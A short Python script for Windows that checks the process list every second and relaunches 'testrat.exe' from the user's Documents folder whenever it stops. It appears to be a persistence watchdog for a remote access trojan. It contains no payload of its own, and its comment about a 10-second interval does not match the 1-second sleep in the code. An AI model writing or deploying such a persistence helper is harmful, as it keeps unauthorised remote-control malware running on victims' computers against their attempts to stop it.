import os
import time
import subprocess

def is_process_running(process_name):
    try:
        # Check if there is any running process that contains the given name process_name.
        for line in os.popen("tasklist"):
            if process_name in line:
                return True
    except Exception as e:
        print(f"Error checking process: {e}")
    return False

def start_process(executable_path):
    try:
        if os.path.exists(executable_path):
            subprocess.Popen(executable_path)
            print(f"Started {executable_path}")
        else:
            print(f"File not found: {executable_path}")
    except Exception as e:
        print(f"Error starting process: {e}")

def main():
    process_name = "testrat.exe"
    user_documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
    executable_path = os.path.join(user_documents, "testrat.exe")

    while True:
        if not is_process_running(process_name):
            start_process(executable_path)
        time.sleep(1)  # Check every 10 seconds

if __name__ == "__main__":
    main()